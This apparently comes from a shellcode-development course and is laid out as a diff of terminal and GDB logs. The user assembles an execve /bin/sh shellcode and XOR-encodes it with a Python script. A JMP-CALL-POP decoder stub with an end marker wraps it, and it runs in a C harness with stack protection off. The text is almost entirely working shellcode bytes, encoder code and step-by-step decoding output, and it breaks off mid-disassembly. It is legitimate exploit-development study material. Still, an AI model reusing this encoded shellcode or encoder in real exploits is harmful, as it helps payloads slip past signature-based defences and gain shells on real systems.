@@ -1,0 +1,636 @@
+XOR Encoder Decoder
+
+1.) Assemble and run
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh  execve-stack-sh.nasm
+kan1shka9@dev:~/Desktop/Remain/28$ ./compile_ld.sh execve-stack-sh
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o
+kan1shka9@dev:~/Desktop/Remain/28$ ./execve-stack-sh
+$ ps
+  PID TTY          TIME CMD
+ 5761 pts/10   00:00:01 bash
+ 5949 pts/10   00:00:00 sh
+ 5950 pts/10   00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/28$ objdump -d ./execve-stack-sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/28$ cp ../27/sh
+shellcode-ls    shellcode-ls.c  shellcode-sh    shellcode-sh.c  shllcode        shllcode.c
+kan1shka9@dev:~/Desktop/Remain/28$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/28$ ./shellcode
+Shellcode length: 25
+$ ps
+  PID TTY          TIME CMD
+ 5761 pts/10   00:00:01 bash
+ 6040 pts/10   00:00:00 sh
+ 6042 pts/10   00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/28$
+
+2.) Python XOR encoder
+kan1shka9@dev:~/Desktop/Remain/28$ cat -n XORencoder.py
+     1  #!/usr/bin/python
+     2
+     3  # Python XOR Encoder
+     4
+     5  shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+     6
+     7  encoded = ""
+     8  encoded2 = ""
+     9
+    10  print 'Encoded shellcode ...'
+    11
+    12  for x in bytearray(shellcode) :
+    13      # XOR Encoding
+    14      y = x^0xAA
+    15      encoded += '\\x'
+    16      encoded += '%02x' % y
+    17
+    18      encoded2 += '0x'
+    19      encoded2 += '%02x,' %y
+    20
+    21  print encoded
+    22
+    23  print encoded2
+    24
+    25  print 'Len: %d' % len(bytearray(shellcode))
+kan1shka9@dev:~/Desktop/Remain/28$ python XORencoder.py
+Encoded shellcode ...
+\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a
+0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,
+Len: 25
+The byte value used to XOR encode cannot be in the shell-code otherwise it will lead to a 0. In this case it is 0xAA.
+
+3.) Using marker
+kan1shka9@dev:~/Desktop/Remain/28$ cp execve-stack-sh.nasm xor-decoder.nasm
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh    execve-stack-sh.nasm  shellcode    xor-decoder.nasm
+execve-stack-sh  execve-stack-sh.o     shellcode.c  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/28$ nano xor-decoder.nasm
+kan1shka9@dev:~/Desktop/Remain/28$
+kan1shka9@dev:~/Desktop/Remain/28$ ./compile_ld.sh xor-decoder
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/28$ objdump -d xor-decoder -M intel
+
+xor-decoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 0d                   jmp    804806f <call_decoder>
+
+08048062 <decoder>:
+ 8048062:       5e                      pop    esi
+ 8048063:       31 c9                   xor    ecx,ecx
+ 8048065:       b1 19                   mov    cl,0x19
+
+08048067 <decode>:
+ 8048067:       80 36 aa                xor    BYTE PTR [esi],0xaa
+ 804806a:       46                      inc    esi
+ 804806b:       e2 fa                   loop   8048067 <decode>
+ 804806d:       eb 05                   jmp    8048074 <Shellcode>
+
+0804806f <call_decoder>:
+ 804806f:       e8 ee ff ff ff          call   8048062 <decoder>
+
+08048074 <Shellcode>:
+ 8048074:       9b                      fwait
+ 8048075:       6a fa                   push   0xfffffffa
+ 8048077:       c2 85 85                ret    0x8585
+ 804807a:       d9 c2                   fld    st(2)
+ 804807c:       c2 85 c8                ret    0xc885
+ 804807f:       c3                      ret
+ 8048080:       c4 23                   les    esp,FWORD PTR [ebx]
+ 8048082:       49                      dec    ecx
+ 8048083:       fa                      cli
+ 8048084:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
+ 8048087:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
+ 804808a:       a1                      .byte 0xa1
+ 804808b:       67                      addr16
+ 804808c:       2a                      .byte 0x2a
+kan1shka9@dev:~/Desktop/Remain/28$ objdump -d ./xor-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c  xor-decoder  xor-decoder.nasm  xor-decoder.o  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/28$ cp shellcode.c shellcode-xor.c
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode  shellcode.c  shellcode-xor.c  xor-decoder  xor-decoder.nasm  xor-decoder.o  XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/28$ nano shellcode-xor.c
+kan1shka9@dev:~/Desktop/Remain/28$ gcc -fno-stack-protector -z execstack shellcode-xor.c -o shellcode-xor
+kan1shka9@dev:~/Desktop/Remain/28$ ./shellcode-xor
+Shellcode length: 45
+$ pwd
+/home/kan1shka9/Desktop/Remain/28
+$ ps
+  PID TTY          TIME CMD
+ 5761 pts/10   00:00:02 bash
+ 6341 pts/10   00:00:00 sh
+ 6388 pts/10   00:00:00 ps
+$
+kan1shka9@dev:~/Desktop/Remain/28$ cp xor-decoder.nasm xor-decoder-marker.nasm
+kan1shka9@dev:~/Desktop/Remain/28$ nano xor-decoder-marker.nasm
+kan1shka9@dev:~/Desktop/Remain/28$ ./compile_ld.sh xor-decoder-marker
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/28$ ls
+compile_ld.sh         execve-stack-sh.o  shellcode-xor    xor-decoder-marker       xor-decoder.nasm
+execve-stack-sh       shellcode          shellcode-xor.c  xor-decoder-marker.nasm  xor-decoder.o
+execve-stack-sh.nasm  shellcode.c        xor-decoder      xor-decoder-marker.o     XORencoder.py
+kan1shka9@dev:~/Desktop/Remain/28$ ./xor-decoder-marker
+Segmentation fault (core dumped)
+kan1shka9@dev:~/Desktop/Remain/28$ objdump -d ./xor-decoder-marker|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa"
+kan1shka9@dev:~/Desktop/Remain/28$ cp shellcode.c shellcode-marker.c
+kan1shka9@dev:~/Desktop/Remain/28$ nano shellcode-marker.c
+kan1shka9@dev:~/Desktop/Remain/28$ gcc -fno-stack-protector -z execstack shellcode-marker.c -o shellcode-marker
+kan1shka9@dev:~/Desktop/Remain/28$ ./shellcode-marker
+Shellcode length: 42
+$ pwd
+/home/kan1shka9/Desktop/Remain/28
+$ exit
+kan1shka9@dev:~/Desktop/Remain/28$
+
+4.) Single step GDB
+kan1shka9@dev:~/Desktop/Remain/28$ gdb ./shellcode-marker -q
+Reading symbols from ./shellcode-marker...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) print /x &code
+$1 = 0x804a040
+(gdb) break *0x804a040
+Breakpoint 1 at 0x804a040
+(gdb) run
+Starting program: /home/kan1shka9/Desktop/Remain/28/shellcode-marker
+Shellcode length: 42
+
+Breakpoint 1, 0x0804a040 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    fwait
+   0x0804a051 <+17>:    push   0xfffffffa
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+(gdb) shell cat shellcode-marker.c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";
+
+main()
+{
+
+    printf("Shellcode length: %d\n", strlen(code));
+
+    int (*ret)() = (int(*)())code;
+
+    ret();
+
+}
+(gdb) x/45xb 0x0804a050
+0x804a050 <code+16>:    0x9b    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85    0xc8    0xc3    0xc4    0x23    0x49    0xfa
+0x804a060 <code+32>:    0x23    0x48    0xf9    0x23    0x4b    0x1a    0xa1    0x67
+0x804a068 <code+40>:    0x2a    0xaa    0x00    0x00    0x00    0x00    0x00    0x00
+0x804a070:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x804a078:      0x00    0x00    0x00    0x00    0x00
+(gdb) x/10i 0x0804a050
+   0x804a050 <code+16>: fwait
+   0x804a051 <code+17>: push   0xfffffffa
+   0x804a053 <code+19>: ret    0x8585
+   0x804a056 <code+22>: fld    st(2)
+   0x804a058 <code+24>: ret    0xc885
+   0x804a05b <code+27>: ret
+   0x804a05c <code+28>: les    esp,FWORD PTR [ebx]
+   0x804a05e <code+30>: dec    ecx
+   0x804a05f <code+31>: cli
+   0x804a060 <code+32>: and    ecx,DWORD PTR [eax-0x7]
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>disassemble
+>x/10xb 0x0804a050
+>x/xb 0x0804a050
+>end
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    fwait
+   0x0804a051 <+17>:    push   0xfffffffa
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+(gdb) stepi
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+=> 0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    fwait
+   0x0804a051 <+17>:    push   0xfffffffa
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x9b    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x9b
+0x0804a04b in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+=> 0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    fwait
+   0x0804a051 <+17>:    push   0xfffffffa
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x9b    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x9b
+0x0804a042 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+=> 0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    fwait
+   0x0804a051 <+17>:    push   0xfffffffa
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x9b    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x9b
+0x0804a043 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+=> 0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    DWORD PTR [edx-0x6],ebp
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a046 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+=> 0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    DWORD PTR [edx-0x6],ebp
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a048 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+=> 0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    DWORD PTR [edx-0x6],ebp
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a049 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+=> 0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    DWORD PTR [edx-0x6],ebp
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0x6a    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a043 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+=> 0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    eax,eax
+   0x0804a052 <+18>:    cli
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0xc0    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a046 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+=> 0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    eax,eax
+   0x0804a052 <+18>:    cli
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0xc0    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a048 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+=> 0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    eax,eax
+   0x0804a052 <+18>:    cli
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0xc0    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a049 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+=> 0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+   0x0804a050 <+16>:    xor    eax,eax
+   0x0804a052 <+18>:    cli
+   0x0804a053 <+19>:    ret    0x8585
+   0x0804a056 <+22>:    fld    st(2)
+   0x0804a058 <+24>:    ret    0xc885
+   0x0804a05b <+27>:    ret
+   0x0804a05c <+28>:    les    esp,FWORD PTR [ebx]
+   0x0804a05e <+30>:    dec    ecx
+   0x0804a05f <+31>:    cli
+   0x0804a060 <+32>:    and    ecx,DWORD PTR [eax-0x7]
+   0x0804a063 <+35>:    and    ecx,DWORD PTR [ebx+0x1a]
+   0x0804a066 <+38>:    mov    eax,ds:0xaa2a67
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0xc0    0xfa    0xc2    0x85    0x85    0xd9    0xc2
+0x804a058 <code+24>:    0xc2    0x85
+0x804a050 <code+16>:    0x31
+0x0804a043 in code ()
+(gdb) break *0x0804a050
+Breakpoint 2 at 0x804a050
+(gdb) c
+Continuing.
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+=> 0x0804a050 <+16>:    xor    eax,eax
+   0x0804a052 <+18>:    push   eax
+   0x0804a053 <+19>:    push   0x68732f2f
+   0x0804a058 <+24>:    push   0x6e69622f
+   0x0804a05d <+29>:    mov    ebx,esp
+   0x0804a05f <+31>:    push   eax
+   0x0804a060 <+32>:    mov    edx,esp
+   0x0804a062 <+34>:    push   ebx
+   0x0804a063 <+35>:    mov    ecx,esp
+   0x0804a065 <+37>:    mov    al,0xb
+   0x0804a067 <+39>:    int    0x80
+   0x0804a069 <+41>:    add    BYTE PTR [eax],al
+End of assembler dump.
+0x804a050 <code+16>:    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a058 <code+24>:    0x68    0x2f
+0x804a050 <code+16>:    0x31
+
+Breakpoint 2, 0x0804a050 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04b <code+11>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    BYTE PTR [esi],0xaa
+   0x0804a046 <+6>:     je     0x804a050 <code+16>
+   0x0804a048 <+8>:     inc    esi
+   0x0804a049 <+9>:     jmp    0x804a043 <code+3>
+   0x0804a04b <+11>:    call   0x804a042 <code+2>
+=> 0x0804a050 <+16>:    xor    eax,eax
+   0x0804a052 <+18>:    push   eax
+   0x0804a053 <+19>:    push   0x68732f2f
+   0x0804a058 <+24>:    push   0x6e69622f
+   0x0804a05d <+29>:    mov    ebx,esp
+   0x0804a05f <+31>:    push   eax
+   0x0804a060 <+32>:    mov    edx,esp
+   0x0804a062 <+34>:    push   ebx
+   0x0804a063 <+35>:    mov    ecx,esp
+   0x0804a065 <+37>:    mov    al,0xb
